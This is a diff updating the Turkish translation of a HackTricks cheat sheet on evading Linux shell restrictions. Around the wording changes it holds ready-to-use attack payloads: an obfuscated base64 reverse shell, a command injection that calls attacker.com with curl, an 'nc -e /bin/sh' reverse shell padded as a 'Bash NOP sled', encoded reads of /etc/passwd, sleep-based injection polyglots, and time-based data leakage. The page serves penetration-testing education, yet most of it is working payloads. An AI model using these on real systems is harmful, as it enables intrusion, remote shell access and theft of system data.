@@ -1,8 +1,8 @@
-# Linux Kısıtlamalarını Atlama
+# Linux Kısıtlamalarını Aşma
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Yaygın Kısıtlama Atlatmaları
+## Yaygın Kısıtlama Aşma Yöntemleri
 
 ### Reverse Shell
 ```bash
@@ -10,7 +10,7 @@
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Short Rev shell
+### Kısa Rev shell
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -105,16 +105,16 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Backslash ve slash kısıtlamalarını bypass etme
+### Backslash ve slash bypass'ı
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Pipe'ları Bypass Et
+### Pipe'ları Bypass Etme
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Hex encoding ile Bypass
+### Hex encoding ile bypass
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -129,11 +129,11 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Zaman tabanlı veri sızdırma
+### Zamana dayalı veri sızdırma
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Env Değişkenlerinden karakter alma
+### Ortam Değişkenlerinden Karakter Alma
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -144,8 +144,8 @@ echo ${PATH:0:1} #/
 
 ### Builtins
 
-Harici işlevleri çalıştıramadığınız ve **RCE elde etmek için sınırlı sayıda builtins'e** erişiminiz olduğu durumlarda, bunu gerçekleştirmek için kullanabileceğiniz bazı pratik yöntemler vardır. Genellikle **tüm** **builtins'leri** kullanamazsınız; bu nedenle jail'i aşmayı denemek için **tüm seçeneklerinizi bilmelisiniz**. Fikir [**devploit**](https://twitter.com/devploit)'ten alınmıştır.\
-Öncelikle tüm [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**'leri** kontrol edin. Ardından burada bazı **öneriler** bulabilirsiniz:
+Harici fonksiyonları çalıştıramadığınız ve yalnızca **RCE elde etmek için sınırlı sayıda builtin'e erişiminiz** olduğu durumlarda bunu yapmak için kullanabileceğiniz bazı pratik yöntemler vardır. Genellikle **tüm** **builtin'leri** kullanamayacağınız için jail'i aşmayı denemek üzere **tüm seçeneklerinizi bilmelisiniz**. Fikir [**devploit**](https://twitter.com/devploit)'ten alınmıştır.\
+Öncelikle tüm [**shell builtin'lerini**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** kontrol edin.** Ardından burada bazı **öneriler** bulabilirsiniz:
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Olası regex'leri bypass etme
+### Potansiyel regex'leri bypass etme
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -296,8 +296,7 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-**read-only ve noexec korumalarına** sahip bir filesystem'in içinde olsanız veya distroless bir container içinde bulunsanız bile, **shell dahil rastgele binary'leri execute etmenin** hâlâ yolları vardır:
-
+**read-only ve noexec korumalarına** sahip bir filesystem'in içinde veya distroless bir container'da olsanız bile, **bir shell dahil olmak üzere arbitrary binary'leri execute etmenin** hâlâ yolları vardır!:
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -305,38 +304,36 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Chroot & other Jails Bypass
 
-
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Bir vulnerability, sonunda `system()` veya başka bir shell'e ulaşan bir argument'ı kısmen kontrol etmenize izin verdiğinde, execution'ın payload'ınızı okumaya başladığı tam offset'i bilmiyor olabilirsiniz. Geleneksel NOP sled'ler (ör. `\x90`) shell syntax'ında **çalışmaz**, ancak Bash bir command'i execute etmeden önce başındaki whitespace karakterlerini zararsız şekilde yok sayar.
+Bir vulnerability, sonunda `system()` veya başka bir shell'e ulaşan bir argument'i kısmen kontrol etmenize izin verdiğinde, execution'ın payload'unuzu okumaya başladığı exact offset'i bilmiyor olabilirsiniz. Geleneksel NOP sled'ler (ör. `\x90`) shell syntax'ında **çalışmaz**, ancak Bash bir command'i execute etmeden önce baştaki whitespace karakterlerini zararsız biçimde yok sayar.
 
-Bu nedenle gerçek command'inizin önüne uzun bir space veya tab karakterleri dizisi ekleyerek *Bash için bir NOP sled* oluşturabilirsiniz:
+Bu nedenle gerçek command'inizin başına uzun bir spaces veya tab karakterleri dizisi ekleyerek *Bash için bir NOP sled* oluşturabilirsiniz:<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Bir ROP chain (veya herhangi bir memory-corruption primitive) instruction pointer'ı space block içindeki herhangi bir konuma getirirse Bash parser, `nc` komutuna ulaşana kadar whitespace karakterlerini basitçe atlar ve command'inizi güvenilir şekilde çalıştırır.
+Bir ROP chain (veya herhangi bir memory-corruption primitive), instruction pointer'ı space block içindeki herhangi bir noktaya getirirse Bash parser, `nc` komutuna ulaşana kadar boşlukları basitçe atlar ve komutunuzu güvenilir bir şekilde çalıştırır.
 
 Pratik kullanım alanları:
 
-1. **Memory-mapped configuration blob'ları** (ör. NVRAM) ve süreçler arasında erişilebilir olanlar.
+1. **Memory-mapped configuration blob'ları** (ör. NVRAM) (process'ler arasında erişilebilir olanlar).
 2. Saldırganın payload'ı hizalamak için NULL byte'lar yazamadığı durumlar.
-3. Yalnızca BusyBox `ash`/`sh` bulunan embedded cihazlar; bunlar da baştaki boşlukları yok sayar.
+3. Yalnızca BusyBox `ash`/`sh` kullanılabilen embedded cihazlar – bunlar da baştaki boşlukları yok sayar.
 
-> 🛠️  Bu tekniği `system()` çağıran ROP gadget'larıyla birleştirerek memory-constrained IoT router'larda exploit güvenilirliğini önemli ölçüde artırın.
+> 🛠️  Bu trick'i `system()` çağıran ROP gadget'larıyla birleştirerek memory-constrained IoT router'larda exploit güvenilirliğini önemli ölçüde artırın.
 
-## Referanslar ve Daha Fazlası
+## References
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
